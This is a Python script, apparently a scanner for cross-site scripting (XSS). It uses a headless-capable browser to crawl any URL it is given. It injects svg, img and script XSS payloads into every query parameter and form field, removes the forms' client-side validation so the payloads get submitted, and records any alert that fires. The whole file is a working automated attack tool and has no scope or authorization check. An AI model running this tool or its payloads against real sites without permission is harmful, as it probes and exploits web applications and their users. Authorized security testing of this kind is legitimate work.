import asyncio, json, random, string, sys, os, time, argparse
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from bs4 import BeautifulSoup
from playwright.async_api import async_playwright
from colorama import Fore, Style, init

init(autoreset=True)

# Helpers
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    print(Fore.CYAN + r"""                                
   _  _____________________ _____ 
  | |/_/ ___/ ___/ ___/ __ `/ __ \
 _>  <(__  |__  ) /__/ /_/ / / / /
/_/|_/____/____/\___/\__,_/_/ /_/ 
                        by pangeran 1.0
""")

def info(msg):
    print(Fore.BLUE + "[*] " + msg)

def ok(msg):
    print(Fore.GREEN + "[✓] " + msg)

def warn(msg):
    print(Fore.YELLOW + "[!] " + msg)

def xss(msg):
    print(Fore.RED + "[🔥 XSS] " + msg)

# Utils
def random_marker():
    return "1337" + ''.join(random.choices(string.digits, k=6))

def payloads(marker):
    return [
        f'"><svg/onload=alert({marker})>',
        f'"><img src=x onerror=prompt({marker})>',
        f'<script>alert({marker})</script>',
    ]

def get_payload_list(marker, aggressive=False, use_all=False):
    pls = payloads(marker)
    if aggressive and not use_all:
        return [pls[0]]
    return pls

def same_domain(u, base):
    return urlparse(u).netloc == urlparse(base).netloc

# Scan
async def scan(target, depth=2):
    visited = set()
    results = []

    clear_screen()
    time.sleep(0.1)
    banner()
    info(f"Target : {target}")
    info(f"Depth  : {depth}")
    print()

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=False)
        ctx = await browser.new_context()
        page = await ctx.new_page()

        current_marker = None
        xss_triggered = False

        async def on_dialog(d):
            nonlocal current_marker, xss_triggered
            xss_triggered = True

            if current_marker and current_marker in d.message:
                xss(f"EXECUTED at {page.url}")
                print(Style.DIM + f"    Message: {d.message}")

                results.append({
                    "url": page.url,
                    "marker": current_marker,
                    "message": d.message
                })

                with open("xss_report.ndjson", "a") as f:
                    f.write(json.dumps(results[-1]) + "\n")

            await d.dismiss()

        page.on("dialog", on_dialog)

        async def crawl(url, lvl):
            nonlocal current_marker, xss_triggered

            if lvl > depth or url in visited:
                return

            visited.add(url)
            info(f"Crawling ({lvl}) → {url}")

            try:
                await page.goto(url, timeout=15000)
                html = await page.content()
            except:
                warn("Failed to load page")
                return

            soup = BeautifulSoup(html, "html.parser")

            # url params
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param in params:
                marker = random_marker()
                for pl in payloads(marker):
                    q = {k: v[:] for k, v in params.items()}
                    q[param] = [pl]

                    test_url = parsed._replace(
                        query=urlencode(q, doseq=True)
                    ).geturl()

                    current_marker = marker
                    await page.goto(test_url)

                    body = await page.content()
                    if marker not in body:
                        continue

                    await page.reload()
                    await page.wait_for_timeout(3000)

            # form
            forms = soup.find_all("form")

            for idx, form in enumerate(forms):
                action = urljoin(url, form.get("action") or url)
                method = form.get("method", "get").lower()

                fields = [
                    i.get("name")
                    for i in form.find_all(["input", "textarea", "select"])
                    if i.get("name")
                ]

                info(f"Form #{idx+1} → {action} ({method.upper()})")

                for param in fields:
                    marker = random_marker()
                    payload_list = get_payload_list(marker, aggressive=True, use_all=True)

                    for pl in payload_list:
                        current_marker = marker
                        xss_triggered = False

                        await page.goto(action)
                        try:
                            await page.evaluate(
                                """(args)=>{
                                    const { field, value } = args;
                                    const forms = document.querySelectorAll("form");
                                    if(!forms.length) return;

                                    for(const f of forms){
                                        if(!f.elements[field]) continue;

                                        f.noValidate = true;

                                        for(const el of f.elements){
                                            if(!el.name || el.disabled) continue;
                                            if(el.type === 'file') continue;

                                            el.removeAttribute('required');
                                            el.removeAttribute('pattern');

                                            if(el.type === 'checkbox' || el.type === 'radio'){
                                                el.checked = true;
                                            } else if(el.tagName === 'SELECT'){
                                                if(el.options.length) el.selectedIndex = 0;
                                            } else {
                                                el.value = 'test';
                                            }
                                        }

                                        f.elements[field].value = value;
                                        HTMLFormElement.prototype.submit.call(f);
                                        return;
                                    }
                                }""",
                                {"field": param, "value": pl}
                            )
                            await page.wait_for_timeout(1500)
                        except Exception as e:
                            warn(f"JS submit error: {e}")

                        if not xss_triggered:
                            warn("Smart submit failed, fallback submit")
                            await page.goto(action)
                            await page.evaluate(
                                """(args)=>{
                                    const { field, value } = args;
                                    const f = document.querySelector("form");
                                    if(!f) return;

                                    for(const el of f.elements){
                                        if(el.name) el.value = value;
                                    }

                                    HTMLFormElement.prototype.submit.call(f);
                                }""",
                                {"field": param, "value": pl}
                            )
                        else:
                            qs = urlencode({param: pl})
                            await page.goto(action + "?" + qs)

                        await page.wait_for_timeout(3000)

            # follow links
            for a in soup.find_all("a", href=True):
                link = urljoin(url, a["href"])
                if same_domain(link, target):
                    await crawl(link, lvl + 1)

        await crawl(target, 0)
        await browser.close()

        print()
        ok("Scan Finished")
        print(Style.DIM + "────────────────────────────────────────────")
        ok(f"URLs Crawled : {len(visited)}")
        ok(f"XSS Found    : {len(results)}")
        print()

# Main
if __name__ == "__main__":
    banner()
    ap = argparse.ArgumentParser(
        usage=f"python3 {os.path.basename(sys.argv[0])} [options]"
    )
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-d", "--depth", type=int, default=2)
    args = ap.parse_args()

    asyncio.run(scan(args.url, args.depth))
